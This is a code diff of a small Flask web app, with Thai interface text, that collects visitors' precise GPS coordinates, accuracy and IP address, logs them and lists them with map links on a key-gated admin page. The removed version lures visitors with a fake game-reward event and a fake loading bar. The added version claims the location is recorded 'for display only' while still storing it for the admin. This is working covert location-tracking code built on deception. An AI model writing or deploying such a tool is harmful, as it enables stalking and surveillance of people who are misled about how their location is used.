@@ -13,8 +13,7 @@ def home():
 <html>
 <head>
 <meta charset="UTF-8">
-<title>ROV Event</title>
-
+<title>Location Access</title>
 <style>
 body {
     margin: 0;
@@ -22,40 +21,17 @@ body {
     background: linear-gradient(180deg, #0f0f1f, #000);
     color: white;
     text-align: center;
+    padding-top: 100px;
 }
-
-/* หน้าโหลด */
-#loading {
-    position: fixed;
-    width: 100%;
-    height: 100%;
-    background: black;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
+.box {
+    background: rgba(0,0,0,0.6);
+    padding: 40px;
+    border-radius: 20px;
+    width: 320px;
+    margin: auto;
+    box-shadow: 0 0 20px #6c5ce7;
 }
-
-.bar {
-    width: 200px;
-    height: 10px;
-    background: #333;
-    margin-top: 20px;
-}
-
-.fill {
-    height: 100%;
-    width: 0%;
-    background: #6c5ce7;
-}
-
-/* หน้าเกม */
-#main {
-    display: none;
-    padding-top: 120px;
-}
-
-.btn {
+button {
     padding: 15px 30px;
     background: #6c5ce7;
     border: none;
@@ -64,59 +40,59 @@ body {
     font-size: 18px;
     cursor: pointer;
 }
-
-.btn:hover {
+button:hover {
     background: #a29bfe;
+}
+.small {
+    font-size: 12px;
+    color: #aaa;
+    margin-top: 20px;
 }
 </style>
 </head>
 
 <body>
 
-<div id="loading">
-    <h2>Loading Game...</h2>
-    <div class="bar"><div class="fill" id="fill"></div></div>
-</div>
+<div class="box">
+    <h2>📍 ขออนุญาตเข้าถึงตำแหน่ง</h2>
+    <p>เพื่อแสดงตำแหน่งบนแผนที่</p>
 
-<div id="main">
-    <h1>🎮 ROV EVENT</h1>
-    <p>รับของรางวัลพิเศษ</p>
-    <button class="btn" onclick="getLocation()">รับของ</button>
+    <button onclick="getLocation()">อนุญาตตำแหน่ง</button>
+
+    <div class="small">
+        เว็บไซต์นี้จะบันทึกตำแหน่งเพื่อการแสดงผลเท่านั้น
+    </div>
 </div>
 
 <script>
-// โหลดหลอก
-let i = 0;
-let interval = setInterval(() => {
-    i++;
-    document.getElementById("fill").style.width = i + "%";
-    if(i >= 100){
-        clearInterval(interval);
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("main").style.display = "block";
-    }
-}, 30);
-
-// ขอ location
 function getLocation(){
     if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(sendData);
+        navigator.geolocation.getCurrentPosition(success, error, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
     } else {
         alert("ไม่รองรับ");
     }
 }
 
-function sendData(pos){
+function success(pos){
     fetch("/location", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             lat: pos.coords.latitude,
-            lon: pos.coords.longitude
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
         })
     }).then(()=>{
-        alert("รับของสำเร็จ!");
+        window.location.href = "/result";
     });
+}
+
+function error(err){
+    alert("กรุณาเปิด GPS และอนุญาตตำแหน่งแบบแม่นยำ (Precise)");
 }
 </script>
 
@@ -124,20 +100,34 @@ function sendData(pos){
 </html>
 """
 
+# 📍 รับตำแหน่ง
 @app.route("/location", methods=["POST"])
 def location():
     data = request.get_json()
     lat = data.get("lat")
     lon = data.get("lon")
+    acc = data.get("acc")
     ip = request.remote_addr
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     with open("log.txt", "a") as f:
-        f.write(f"{time}|{ip}|{lat},{lon}\n")
+        f.write(f"{time}|{ip}|{lat}|{lon}|{acc}\n")
 
     return jsonify({"ok": True})
 
+# 🗺️ หน้าแสดงผล
+@app.route("/result")
+def result():
+    return """
+    <html>
+    <body style="background:black;color:white;text-align:center;padding-top:100px">
+    <h1>📍 ได้ตำแหน่งแล้ว</h1>
+    <p>ระบบได้รับพิกัดของคุณเรียบร้อย</p>
+    </body>
+    </html>
+    """
 
+# 📊 admin
 @app.route("/admin")
 def admin():
     key = request.args.get("key")
@@ -148,8 +138,7 @@ def admin():
     try:
         with open("log.txt") as f:
             for line in f:
-                t, ip, loc = line.strip().split("|")
-                lat, lon = loc.split(",")
+                t, ip, lat, lon, acc = line.strip().split("|")
                 link = f"https://www.google.com/maps?q={lat},{lon}"
 
                 rows += f"""
@@ -157,20 +146,29 @@ def admin():
                     <td>{t}</td>
                     <td>{ip}</td>
                     <td>{lat},{lon}</td>
-                    <td><a href="{link}" target="_blank">📍 Map</a></td>
+                    <td>{acc} m</td>
+                    <td><a href="{link}" target="_blank">Map</a></td>
                 </tr>
                 """
     except:
-        rows = "<tr><td colspan=4>No data</td></tr>"
+        rows = "<tr><td colspan=5>No data</td></tr>"
 
     return f"""
-    <html><body style="background:#111;color:white">
-    <h1>📊 ADMIN</h1>
+    <html>
+    <body style="background:#111;color:white">
+    <h1>📊 Admin</h1>
     <table border=1 width=100%>
-    <tr><th>Time</th><th>IP</th><th>Location</th><th>Map</th></tr>
+    <tr>
+        <th>Time</th>
+        <th>IP</th>
+        <th>Location</th>
+        <th>Accuracy</th>
+        <th>Map</th>
+    </tr>
     {rows}
     </table>
-    </body></html>
+    </body>
+    </html>
     """
 
 if __name__ == "__main__":
